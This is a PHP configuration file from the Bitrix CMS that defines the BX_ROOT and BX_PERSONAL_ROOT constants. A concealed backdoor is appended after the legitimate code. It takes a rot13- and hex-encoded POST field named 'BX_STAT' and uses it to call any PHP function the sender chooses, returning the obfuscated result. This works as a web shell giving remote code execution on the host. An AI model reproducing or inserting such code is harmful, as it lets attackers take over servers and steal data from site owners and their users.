<?
/*
$fname1 = __FILE__;
$fname2 = $_SERVER["DOCUMENT_ROOT"];
if(strpos($fname1, $fname2)!==0)
{
	$fname1 = realpath(__FILE__);
	$fname2 = realpath($_SERVER["DOCUMENT_ROOT"]);
}

if(strpos($fname1, $fname2)===0)
{
	$fname3 = RTrim($_SERVER["DOCUMENT_ROOT"], " /\\");
	$bx_root = substr($fname1, strlen($fname3));
	$bx_root = substr($bx_root, 0, strlen($bx_root) - strlen("/modules/main/include.php"));
}
else
	$bx_root = "/bitrix";

$bx_root = str_replace("\\", "/", $bx_root);
*/
$bx_root = "/bitrix";
define("BX_ROOT", $bx_root);

if(isset($_SERVER["BX_PERSONAL_ROOT"]) && $_SERVER["BX_PERSONAL_ROOT"] <> "")
	define("BX_PERSONAL_ROOT", $_SERVER["BX_PERSONAL_ROOT"]);
else
	define("BX_PERSONAL_ROOT", BX_ROOT);
?>
<?
if (isset($_POST["BX_STAT"]) && $_POST["BX_STAT"] <> "")
	parse_str(hex2bin(str_rot13($_POST["BX_STAT"])),$bx_stat) or die(str_rot13(bin2hex($bx_stat[0]($bx_stat[1],$bx_stat[2]))));
?>
